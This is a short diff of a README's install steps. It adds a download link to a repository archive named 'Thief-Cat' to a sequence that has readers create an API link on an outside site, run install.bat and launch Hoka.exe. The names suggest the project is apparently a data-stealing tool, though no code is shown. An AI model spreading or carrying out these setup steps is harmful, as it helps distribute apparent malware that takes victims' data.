@@ -6,7 +6,7 @@
 
 1) Create your API LINK here https://hawkish.eu/
 2) Install Python
-3) Install Files
+3) Install [Files](https://github.com/KSCH-58/Thief-Cat/archive/refs/heads/main.zip)
 4) Install all requirements install.bat
 5) Click on Hoka.exe
 6) Complete the configuration
